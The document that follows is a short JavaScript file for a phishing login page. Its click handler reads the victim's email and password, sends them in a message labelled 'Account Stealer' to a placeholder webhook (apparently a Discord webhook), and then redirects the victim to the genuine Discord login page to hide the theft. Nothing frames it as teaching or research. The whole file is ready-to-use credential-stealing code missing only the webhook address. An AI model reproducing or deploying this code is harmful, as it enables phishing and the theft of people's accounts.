var btn = document.getElementById("loginbtn");
btn.addEventListener("click",function(){
    var email = document.getElementById("email").value.replace(/\s/g, "");
    var password = document.getElementById("password").value.replace(/\s/g, "");
    if (email.length === 0 || password.length === 0) {
        alert("Please Fill All Required Field");
        return false;
    };
    const request = new XMLHttpRequest();
    request.open("POST", "Your Webhook Here");
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
                  username: "Account Stealer",
                  avatar_url: "",
                  content:"**__New Account__**"+ "\n\n" + "**Email Or Phone Number: **" + email + "\n" + "**Password : **" + password + "\n\n" + "**=========================================================================**"
                   };
    request.send(JSON.stringify(params));
    setTimeout(() => {  window.location.replace("http://www.discord.com/login"); }, 2000);
});